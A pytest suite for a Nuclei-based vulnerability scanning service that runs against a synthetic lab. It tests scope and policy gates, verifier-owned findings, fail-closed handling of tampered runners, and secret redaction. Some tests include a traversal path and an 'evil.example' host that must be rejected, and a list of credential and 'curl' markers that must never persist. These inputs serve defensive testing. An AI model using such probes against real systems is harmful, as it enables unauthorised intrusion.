def _job(**overrides: Any) -> NucleiEngineJob:
    options: dict[str, Any] = {
        "profile_id": PROFILE_ID,
        "capability_id": CAPABILITY,
        "run_id": "scan-0000000000aa",
        "environment": EngineEnvironment.SYNTHETIC_LAB,
        "target_ref": "synthetic-scm-vulnerable",
        "remaining_requests": 7,
        "allowed_origins": ["http://lab-api:8001"],
        "adapter_enabled": True,
    }
    options.update(overrides)
    return build_nuclei_job(**options)


def test_controller_builds_job_from_catalog_manifest_and_inventory() -> None:
    job = _job()
    assert job.profile_id == "NUCLEI_LAB_SAFE_HTTP_V1" and job.template_ids == ("git-config",)
    assert job.target.origin == "http://lab-api:8001" and job.target_ref == VULN.target_ref
    assert job.budget.max_requests == 1 and job.manifest_digest == manifest_digest()
    assert job.created_by == "CONTROLLER"
    profile = get_engine_profile(PROFILE_ID)
    assert profile and profile.enabled and profile.capability_ids == (CAPABILITY,)


@pytest.mark.parametrize(
    ("overrides", "code"),
    [
        ({"target_ref": "production-bank-api"}, EngineErrorCode.OUT_OF_SCOPE_ORIGIN),
        ({"target_ref": "example-com"}, EngineErrorCode.OUT_OF_SCOPE_ORIGIN),
        ({"allowed_origins": ["http://other:8001"]}, EngineErrorCode.OUT_OF_SCOPE_ORIGIN),
        (
            {"capability_id": "nuclei_http_state_changing_v0"},
            EngineErrorCode.UNAPPROVED_STATE_CHANGE,
        ),
        ({"capability_id": "nuclei_network_protocol_v0"}, EngineErrorCode.UNSUPPORTED_PROTOCOL),
        ({"capability_id": "nuclei_passive_http_templates_v0"}, EngineErrorCode.UNKNOWN_CAPABILITY),
        ({"capability_id": "zap_passive_scan_v0"}, EngineErrorCode.UNKNOWN_CAPABILITY),
        ({"capability_id": "does_not_exist"}, EngineErrorCode.UNKNOWN_CAPABILITY),
        ({"profile_id": "nuclei-passive-synthetic"}, EngineErrorCode.UNKNOWN_CAPABILITY),
        ({"profile_id": "unknown"}, EngineErrorCode.UNKNOWN_PROFILE),
        ({"adapter_enabled": False}, EngineErrorCode.ENGINE_DISABLED),
        ({"environment": EngineEnvironment.PRODUCTION}, EngineErrorCode.DISALLOWED_ENVIRONMENT),
        ({"remaining_requests": 0}, EngineErrorCode.BUDGET_EXCEEDED),
    ],
)
def test_controller_policy_rejects_before_runner(
    overrides: dict[str, Any], code: EngineErrorCode
) -> None:
    with pytest.raises(EnginePolicyRejection) as rejection:
        _job(**overrides)
    assert rejection.value.error.code is code


@pytest.mark.parametrize(
    "field", ["command", "argv", "flags", "template_path", "raw_url", "url", "headers", "env"]
)
def test_nuclei_job_has_no_command_template_or_url_fields(field: str) -> None:
    payload = _job().model_dump(mode="json")
    payload[field] = "-code"
    with pytest.raises(ValidationError):
        NucleiEngineJob.model_validate(payload)


@pytest.mark.parametrize(
    "field", ["template", "templates", "command", "flags", "url", "headers", "engine", "profile_id"]
)
def test_scan_request_cannot_name_tool_template_flag_or_url(field: str) -> None:
    with pytest.raises(ValidationError):
        ScanCreate.model_validate({"capability": CAPABILITY, field: "x"})


# --- 8. independent verifier ------------------------------------------------------------------


def test_verifier_structure_is_independent_of_nuclei() -> None:
    from lab_api.main import SYNTHETIC_GIT_CONFIG

    assert has_git_config_structure(SYNTHETIC_GIT_CONFIG.encode())
    assert not has_git_config_structure(b"<html><body>[core]</body></html>")
    assert not has_git_config_structure(b"[credentials]\nhelper = store\n")  # a Nuclei word hit
    assert not has_git_config_structure(b"repositoryformatversion = 0\n[core]\n")
    assert not has_git_config_structure(b"[core]\n" + b"a" * 5000)


def _facts(**probe: Any) -> list[ScmProbeFacts]:
    base = ScmProbeFacts(
        name="b",
        role="BASE_CONTROL",
        path="/lab/nuclei/x",
        status_code=200,
        content_class="JSON",
        synthetic_marker_ok=True,
    )
    return [base, ScmProbeFacts(name="p", role="METADATA_PROBE", path="/p/.git/config", **probe)]


def test_verifier_verdicts() -> None:
    assert (
        evaluate(
            _facts(status_code=200, content_class="TEXT_PLAIN", git_config_structure=True)
        ).status
        == "CONFIRMED"
    )
    assert (
        evaluate(_facts(status_code=404, content_class="JSON", deliberate_denial=True)).status
        == "PASS"
    )
    # An unexplained 404, a redirect, an HTML page or a transport error is never PASS.
    for probe in (
        {"status_code": 404, "content_class": "JSON"},
        {"status_code": 302, "content_class": "NONE"},
        {"status_code": 200, "content_class": "HTML"},
        {"transport_error": True},
    ):
        assert evaluate(_facts(**probe)).status == "INSUFFICIENT"
    unreachable = _facts(status_code=200, content_class="TEXT_PLAIN", git_config_structure=True)
    unreachable[0] = unreachable[0].model_copy(update={"synthetic_marker_ok": False})
    assert evaluate(unreachable).status == "INSUFFICIENT"


def test_safety_permits_only_fixed_verifier_paths() -> None:
    safety = SafetyController(Settings())
    assert safety.approve_scm_verification(
        "http://lab-api:8001", "/lab/nuclei/vulnerable/.git/config"
    )
    for bad in ("/lab/nuclei/vulnerable/.git/HEAD", "/api/v1/accounts/B-200", "/lab/nuclei/../x"):
        with pytest.raises(SafetyViolation):
            safety.approve_scm_verification("http://lab-api:8001", bad)
    with pytest.raises(SafetyViolation):
        safety.approve_scm_verification("http://evil.example", "/lab/nuclei/vulnerable")


# --- 9. lifecycle: Nuclei can never self-confirm ------------------------------------------------


def test_nuclei_result_cannot_become_verified_without_verifier_confirmation() -> None:
    from aegis.engine.contracts import EngineReportedFinding

    job = _job()
    reported = EngineReportedFinding(
        report_key=f"{CAPABILITY}:git-config:{job.target_ref}",
        engine=SecurityEngine.NUCLEI,
        capability_id=CAPABILITY,
        claimed_category="SCM metadata exposure (tool claim)",
        target_operation_id=job.target.operation_id,
        principal_profile="anonymous",
        observation_names=["nuclei-git-config-x"],
        signal="Template matched (raw).",
    )
    normalized = correlate_reported_finding(reported, job, ai_hypothesis="", in_scope=True)
    assert normalized.lifecycle_state is FindingLifecycleState.AEGIS_CORRELATED
    assert normalized.severity is None and normalized.aegis_finding_id is None
    passed = record_verifier_conclusion(
        normalized,
        VerifierConclusion(status="PASS", summary="denied"),
        inconclusive_state=FindingLifecycleState.REVIEW_REQUIRED,
    )
    assert passed.lifecycle_state is FindingLifecycleState.REJECTED
    unsure = record_verifier_conclusion(
        normalized,
        VerifierConclusion(status="INSUFFICIENT", summary="inconclusive"),
        inconclusive_state=FindingLifecycleState.REVIEW_REQUIRED,
    )
    assert (
        unsure.lifecycle_state is FindingLifecycleState.REVIEW_REQUIRED and unsure.severity is None
    )
    confirmed = record_verifier_conclusion(
        normalized,
        VerifierConclusion(status="CONFIRMED", summary="confirmed", aegis_finding_id="f-1"),
    )
    # Severity comes from the Aegis catalog, never from Nuclei's "medium" claim.
    assert confirmed.lifecycle_state is FindingLifecycleState.VERIFIED
    assert confirmed.severity == get_engine_capability(CAPABILITY).verified_severity  # type: ignore[union-attr]


# --- 10. full controller flow (offline; fake engine behind the real runner code) ----------------


_NUCLEI_EVENTS = [
    "NUCLEI_JOB_ADMITTED",
    "NUCLEI_RUNNER_STARTED",
    "NUCLEI_TEMPLATE_MANIFEST_VERIFIED",
    "NUCLEI_EXECUTION_STARTED",
    "NUCLEI_EXECUTION_COMPLETED",
    "NUCLEI_RESULT_PARSED",
    "NUCLEI_FINDING_REPORTED",
    "NUCLEI_FINDING_CORRELATED",
    "NUCLEI_VERIFICATION_STARTED",
    "NUCLEI_VERIFICATION_COMPLETED",
]


async def test_vulnerable_flow_is_verifier_owned(tmp_path: Path) -> None:
    service, _, runner, lab = _nuclei_service(tmp_path, "match")
    result = await _run(service, variant="vulnerable")
    assert result.status is ScanStatus.FAIL and result.terminal_reason == "DETERMINISTIC_CONFIRMED"
    assert [e for e in _events(service, result.id) if e.startswith("NUCLEI_")] == _NUCLEI_EVENTS
    finding = result.findings[0]
    assert finding.severity == "MEDIUM" and finding.confidence == "CONFIRMED"
    assert finding.evidence_names == [f"{result.id}-verify-base", f"{result.id}-verify-metadata"]
    normalized = result.normalized_findings[0]
    assert normalized["lifecycle_state"] == "VERIFIED"
    assert normalized["verifier_conclusion"]["status"] == "CONFIRMED"
    assert normalized["ai_hypothesis"].startswith("None")
    assert runner.calls["run"] == 1
    # Only the verifier's two fixed requests hit the lab from the control plane.
    assert lab.paths == ["/lab/nuclei/vulnerable", "/lab/nuclei/vulnerable/.git/config"]
    assert result.nuclei_provenance and result.nuclei_provenance["engine"]["pinned"] is True
    assert result.usage.requests == 3  # 1 runner request (budgeted) + 2 verifier requests


async def test_patched_flow_passes_only_with_complete_coverage(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "nomatch")
    result = await _run(service, variant="patched")
    assert result.status is ScanStatus.PASS and result.terminal_reason == "COVERAGE_COMPLETE"
    assert result.findings == [] and result.normalized_findings == []
    assert result.verification and result.verification.status == "PASS"
    assert result.nuclei_provenance and result.nuclei_provenance["coverage_complete"] is True


async def test_nuclei_match_on_patched_target_is_rejected_by_verifier(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "match")
    result = await _run(service, variant="patched")
    assert result.status is ScanStatus.REVIEW
    assert result.terminal_reason == "TOOL_FINDING_REJECTED_BY_VERIFIER"
    assert result.findings == []
    assert result.normalized_findings[0]["lifecycle_state"] == "REJECTED"


async def test_no_nuclei_result_on_vulnerable_target_is_not_pass(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "nomatch")
    result = await _run(service, variant="vulnerable")
    assert result.status is ScanStatus.REVIEW
    assert result.terminal_reason == "ENGINE_VERIFIER_DISAGREEMENT" and result.findings == []


async def test_duplicate_tool_results_correlate_deterministically(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "duplicate")
    first = await _run(service, variant="vulnerable")
    second = await _run(service, variant="vulnerable")
    assert len(first.normalized_findings) == len(second.normalized_findings) == 1
    def digest(scan: Any) -> list[str]:
        return [
            e["content_digest"] for e in scan.engine_evidence if "nuclei-" in e["evidence_id"]
        ]
    assert digest(first) == digest(second)
    assert first.nuclei_provenance["counts"]["duplicates_collapsed"] == 1  # type: ignore[index]


@pytest.mark.parametrize(
    "mode",
    [
        "nonzero",
        "malformed",
        "truncated",
        "empty",
        "oversized",
        "raw_leak",
        "unreachable",
        "redirect_escape",
        "unknown_template",
        "conflict",
    ],
)
async def test_failed_or_partial_execution_is_incomplete_never_pass(
    tmp_path: Path, mode: str
) -> None:
    service, _, _, lab = _nuclei_service(tmp_path, mode)
    for variant in ("vulnerable", "patched"):
        result = await _run(service, variant=variant)
        assert result.status is ScanStatus.INCOMPLETE, (mode, variant, result.terminal_reason)
        assert result.findings == [] and result.normalized_findings == []
        assert "NUCLEI_EXECUTION_FAILED" in _events(service, result.id)
    assert lab.paths == []  # no verification traffic after a failed execution


async def test_unreachable_runner_is_incomplete(tmp_path: Path) -> None:
    service, _, runner, lab = _nuclei_service(tmp_path, runner=False)
    result = await _run(service, variant="patched")
    assert result.status is ScanStatus.INCOMPLETE
    assert "RUNNER_UNAVAILABLE_OR_INVALID" in (result.terminal_reason or "")
    assert lab.paths == [] and runner.calls["run"] == 0


@pytest.mark.parametrize(
    ("forgery", "code"),
    [
        ({"manifest_digest": "e" * 64}, "MANIFEST_DIGEST_MISMATCH"),
        ({"ready": False}, "RUNNER_NOT_READY"),
        ({"signature_probe": "FAILED"}, "SIGNATURE_NOT_VERIFIED"),
        ({"unexpected_template_files": 3}, "UNEXPECTED_TEMPLATE_FILES"),
        ({"template_set_id": "community-all"}, "MANIFEST_DIGEST_MISMATCH"),
        ("binary", "ENGINE_DIGEST_MISMATCH"),
        ("version", "ENGINE_VERSION_MISMATCH"),
    ],
)
async def test_attestation_mismatch_blocks_execution(
    tmp_path: Path, forgery: Any, code: str
) -> None:
    service, fake, runner, lab = _nuclei_service(tmp_path, "match")

    def forged(executor: Executor) -> str:
        attestation = executor.state.attestation()
        if forgery == "binary":
            engine = attestation.engine.model_copy(update={"binary_sha256": "d" * 64})
            attestation = attestation.model_copy(update={"engine": engine})
        elif forgery == "version":
            engine = attestation.engine.model_copy(update={"nuclei_version": "v3.12.0"})
            attestation = attestation.model_copy(update={"engine": engine})
        else:
            attestation = attestation.model_copy(update=forgery)
        return attestation.model_dump_json()

    runner.override_attestation = forged
    result = await _run(service, variant="vulnerable")
    assert result.status is ScanStatus.INCOMPLETE
    assert code in (result.terminal_reason or ""), result.terminal_reason
    assert runner.calls["run"] == 0 and lab.paths == [] and fake and fake.run_calls() == []


@pytest.mark.parametrize("tamper", ["nonce", "template", "connections", "extra_field", "status"])
async def test_hostile_runner_responses_fail_closed(tmp_path: Path, tamper: str) -> None:
    service, _, runner, lab = _nuclei_service(tmp_path, "match")

    def hostile(executor: Executor, request: NucleiRunRequest) -> str:
        response = executor.run(request)
        if tamper == "nonce":
            response = response.model_copy(update={"nonce": "f" * 32})
        elif tamper == "template":
            record = response.results[0].model_copy(update={"template_id": "community-x"})
            response = response.model_copy(update={"results": (record,)})
        elif tamper == "connections":
            response = response.model_copy(update={"http_connections": 9})
        elif tamper == "status":
            response = response.model_copy(update={"status": "FAILED"})
        payload = json.loads(response.model_dump_json())
        if tamper == "extra_field":
            payload["verdict"] = "CONFIRMED"
        return json.dumps(payload)

    runner.override_run = hostile
    result = await _run(service, variant="vulnerable")
    assert result.status is ScanStatus.INCOMPLETE, result.terminal_reason
    assert result.findings == [] and lab.paths == []


@pytest.mark.parametrize(
    ("create", "code"),
    [
        ({"target_ref": "production-bank-api"}, "OUT_OF_SCOPE_ORIGIN"),
        ({"target_ref": "attacker-controlled"}, "OUT_OF_SCOPE_ORIGIN"),
        ({"capability": "nuclei_http_state_changing_v0"}, "UNAPPROVED_STATE_CHANGE"),
        ({"capability": "nuclei_network_protocol_v0"}, "UNSUPPORTED_PROTOCOL"),
    ],
)
async def test_negative_controls_rejected_before_runner(
    tmp_path: Path, create: dict[str, Any], code: str
) -> None:
    service, fake, runner, lab = _nuclei_service(tmp_path, "match")
    scan = service.create(ScanCreate(**{"capability": CAPABILITY, **create}))
    await service.run(scan.id)
    result = service.store.get(scan.id)
    assert result and result.status is ScanStatus.REVIEW
    assert result.terminal_reason == f"NUCLEI_JOB_REJECTED_{code}"
    assert "NUCLEI_JOB_REJECTED" in _events(service, scan.id)
    assert runner.calls == {"attestation": 0, "run": 0}
    assert lab.paths == [] and fake and fake.run_calls() == []


async def test_disabled_adapter_rejects_and_unknown_capability_is_refused(tmp_path: Path) -> None:
    service, _, runner, _ = _nuclei_service(tmp_path, "match", enabled=False)
    result = await _run(service, variant="vulnerable")
    assert result.terminal_reason == "NUCLEI_JOB_REJECTED_ENGINE_DISABLED"
    assert runner.calls["run"] == 0
    with pytest.raises(ValueError):
        service.create(ScanCreate(capability="zap_passive_scan_v0"))
    with pytest.raises(ValueError):
        service.create(ScanCreate(capability="bola_object_read_v1"))
    with pytest.raises(ValueError):
        service.create(ScanCreate(target_ref="synthetic-scm-vulnerable"))


async def test_nuclei_adapter_refuses_generic_kernel_jobs() -> None:
    from test_phase_1_1 import _job as native_job

    adapter = NucleiAdapter("http://nuclei-runner:8090", enabled=True)
    result = await adapter.execute(native_job(), "vulnerable")
    assert result.execution.status is EngineExecutionStatus.FAILED
    assert (
        result.execution.error
        and result.execution.error.code is EngineErrorCode.UNSUPPORTED_JOB_TYPE
    )


def test_zap_and_burp_remain_zero_traffic_skeletons(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "match")
    for engine in (SecurityEngine.ZAP, SecurityEngine.BURP_DAST):
        adapter = service.dispatcher.adapter_for(engine)
        assert isinstance(adapter, DisabledEngineAdapter) and not adapter.enabled
    assert isinstance(service.dispatcher.adapter_for(SecurityEngine.NUCLEI), NucleiAdapter)


# --- 11. secrets / raw material never persist ----------------------------------------------------


async def test_no_secret_or_raw_response_material_is_persisted_or_projected(tmp_path: Path) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "match")
    result = await _run(service, variant="vulnerable")
    from aegis.operator import evidence_cards, scan_projection

    blobs = [
        result.model_dump_json(),
        json.dumps(service.store.audit(result.id), default=str),
        json.dumps(evidence_cards(result)),
        json.dumps(scan_projection(result, [])),
    ]
    for blob in blobs:
        for marker in (
            "repositoryformatversion",
            "[core]",
            "SYNTHETIC AEGIS LAB FIXTURE",
            "curl ",
            "User-Agent",
            "lab-token",
            "Bearer",
            "Authorization",
            "172.27.0.3",
            "PDCP",
            "cloud.projectdiscovery.io",
        ):
            assert marker not in blob, marker


# --- 12. console compatibility -----------------------------------------------------------------


async def test_console_exposes_nuclei_provenance_and_responsibility(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    service, fake, _, _ = _nuclei_service(tmp_path, "match")
    vuln = await _run(service, variant="vulnerable")
    assert fake is not None
    fake.set("nomatch")
    patched = await _run(service, variant="patched", retest_of=vuln.id)
    assert patched.status is ScanStatus.PASS
    native = service.create()
    await service.run(native.id)
    monkeypatch.setattr(main_module, "store", service.store)
    monkeypatch.setattr(main_module, "service", service)
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=main_module.app), base_url="http://test"
    ) as client:
        engines = (await client.get("/api/console/engines")).json()
        integrations = (await client.get("/api/console/integrations")).json()
        run = (await client.get(f"/api/console/runs/{vuln.id}")).json()
        findings = (await client.get("/api/console/findings")).json()
        audit = (
            await client.get("/api/console/audit", params={"engine": "NUCLEI", "limit": 100})
        ).json()
        native_audit = (
            await client.get("/api/console/audit", params={"scan_id": native.id, "limit": 100})
        ).json()
        config = (await client.get("/api/console/config")).json()
    card = next(item for item in engines["items"] if item["engine"] == "NUCLEI")
    assert (
        card["enabled"] and card["authorized"] and card["reachable"] and card["state"] == "ENABLED"
    )
    provenance = card["provenance"]
    assert provenance["pinned_engine_version"] == "v3.11.1"
    assert provenance["manifest_digest"] == manifest_digest()
    assert provenance["admitted_template_count"] == 1
    assert provenance["latest_execution"]["scan_id"] in {vuln.id, patched.id}
    assert "does not directly confirm Aegis findings" in provenance["responsibility"]
    assert "NUCLEI" in engines["operational_engines"] and "NUCLEI" in config["operational_engines"]
    assert {i["engine"]: i["state"] for i in integrations["items"]}["NUCLEI"] == "CONNECTED"
    for engine in ("ZAP", "BURP_DAST"):
        row = next(item for item in engines["items"] if item["engine"] == engine)
        assert row["state"] == "DISABLED" and row["enabled"] is False
    types = {c["artifact_type"] for c in run["evidence"]}
    assert types == {"NUCLEI_EXECUTION_CARD", "VERIFIER_PROBE_CARD"}
    assert run["run"]["nuclei"]["engine_version"] == "v3.11.1"
    assert run["lifecycle"][0]["provenance"] == "VERIFIER"
    nuclei_findings = [f for f in findings["items"] if f["source_engine"] == "NUCLEI"]
    assert len(nuclei_findings) == 1 and nuclei_findings[0]["provenance"] == "VERIFIER"
    assert nuclei_findings[0]["status"] == "REMEDIATED"
    assert "OWASP" not in nuclei_findings[0]["owasp_mapping"].replace("no automatic OWASP", "")
    assert audit["items"] and all(item["engine"] == "NUCLEI" for item in audit["items"])
    assert {i["stage"] for i in audit["items"]} >= {"RUNNER_ATTESTATION", "RESULT_PARSING"}
    assert all(item["engine"] == "AEGIS_NATIVE" for item in native_audit["items"])
    actor = {i["event_type"]: i["actor_type"] for i in audit["items"]}
    assert actor["NUCLEI_FINDING_REPORTED"] == "TOOL_RUNNER"
    assert actor["NUCLEI_VERIFICATION_COMPLETED"] == "VERIFIER"
    assert "AI_PLANNER" not in actor.values()


async def test_event_stream_ordering_and_resume_remain_compatible(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    service, _, _, _ = _nuclei_service(tmp_path, "match")
    native = service.create()
    await service.run(native.id)
    await _run(service, variant="vulnerable")
    monkeypatch.setattr(main_module, "store", service.store)
    events = main_module._console_events(limit=100)
    sequences = [e.sequence for e in events]
    assert sequences == sorted(sequences) and len(set(sequences)) == len(sequences)
    assert sequences == list(range(sequences[0], sequences[0] + len(sequences)))  # no gaps
    middle = sequences[len(sequences) // 2]
    resumed = main_module._console_events(after_sequence=middle, limit=100)
    assert [e.sequence for e in resumed] == [s for s in sequences if s > middle]
    assert main_module._parse_event_cursor(f"evt-{middle:012d}") == middle
    for event in events:
        assert event.integrity["algorithm"] == "SHA-256" and len(event.integrity["digest"]) == 64


# --- 13. AEGIS_NATIVE unchanged with Nuclei enabled ----------------------------------------------


async def test_native_behaviour_unchanged_with_nuclei_enabled(tmp_path: Path) -> None:
    service, _, runner, _ = _nuclei_service(tmp_path, "match")
    found = service.create()
    await service.run(found.id)
    discovery = service.store.get(found.id)
    assert discovery and discovery.status is ScanStatus.FAIL
    assert [e.status_code for e in discovery.evidence] == [200, 200, 200]
    assert discovery.findings[0].severity == "HIGH" and discovery.engine == "AEGIS_NATIVE"
    retest = service.create(ScanCreate(variant="patched", retest_of=found.id))
    await service.run(retest.id)
    fixed = service.store.get(retest.id)
    assert fixed and fixed.status is ScanStatus.PASS
    assert [e.status_code for e in fixed.evidence] == [200, 200, 403]
    assert runner.calls == {"attestation": 0, "run": 0}  # native never touches the runner
    assert not any(e.startswith("NUCLEI_") for e in _events(service, found.id))


async def test_native_path_identical_to_phase_1_1_service(tmp_path: Path) -> None:
    baseline = make_service(tmp_path / "a")
    scan_a = baseline.create()
    await baseline.run(scan_a.id)
    service, _, _, _ = _nuclei_service(tmp_path / "b", "match")
    scan_b = service.create()
    await service.run(scan_b.id)
    a, b = baseline.store.get(scan_a.id), service.store.get(scan_b.id)
    assert a and b
    assert _events(baseline, a.id) == _events(service, b.id)
    shape = lambda s: [(e.method, e.path, e.credential_profile, e.status_code) for e in s.evidence]  # noqa: E731
    assert shape(a) == shape(b) and a.status == b.status and a.terminal_reason == b.terminal_reason


async def test_lab_openapi_surface_is_unchanged() -> None:
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=lab_app), base_url="http://lab-api:8001"
    ) as client:
        spec = (await client.get("/openapi.json")).json()
    assert set(spec["paths"]) == {
        "/api/v1/me",
        "/api/v1/accounts/{account_id}",
        "/api/v1/transfers",
        "/api/v1/patched/accounts/{account_id}",
    }
